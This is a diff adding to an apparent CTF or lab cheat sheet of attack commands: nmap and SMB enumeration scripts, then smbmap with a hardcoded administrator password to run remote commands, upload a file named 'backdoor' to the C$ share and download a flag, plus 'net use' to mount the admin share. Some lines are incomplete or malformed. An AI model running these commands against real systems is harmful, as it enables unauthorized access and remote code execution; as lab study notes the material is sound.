@@ -1,3 +1,27 @@
 nmap -sC -sV -oA nmap/ctf 10.4.25.246
 nmap -Pn 10.0.30.43  #icmp desabled servers port scan)
-nmap -Pn -sV -p 10.0.30.43 # scan the filter port by fileter OS firewall or firewall.
+nmap -Pn -sV -p 10.0.30.43 # scan port 80 information
+nmap 10.0.1.2/20 --open #scan open port
+nmap -p445 --script smb-protocols 10.0.17.200 #SMB port scan command
+nmap -p445 --script smb-security-mode 10.0.17.200 #check the security mode
+nmap -p445 --script smb-enum-sessions 10.0.17.200 #enumulate the sesstion
+nmap -p445 --script smb-enum-shares 10.0.17.200 #Enumerating all available shares.
+nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200 #Enumerate the windows users on a target machine.
+nmap -p445 --script smb-server-stats --script-args 
+nmap -p445 --script smb-enum-domains --script-args #Enumerating available domains on a target machine.
+
+
+
+smbmap -u guest -p "" -d . -H 10.0.28.123 #Running smbmap tool to discover all shared folders and drives.We will find all the shared folders using a guest user account.
+smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123 #Running smbmap with administrator user credentials.
+smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig' #: Execute the command on the target machine through SMB.
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L #Listing all drives on the specified host
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' # Uploading a sample file touch backdoor'C$\backdoor
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$ #brows directory 
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download  #Download the flag.txt file.
+
+
+
+windows mount and umount 
+net use Z: \\10.0.22.92\C$ [password] /user:administrator #mount
+net use * /delete #umount
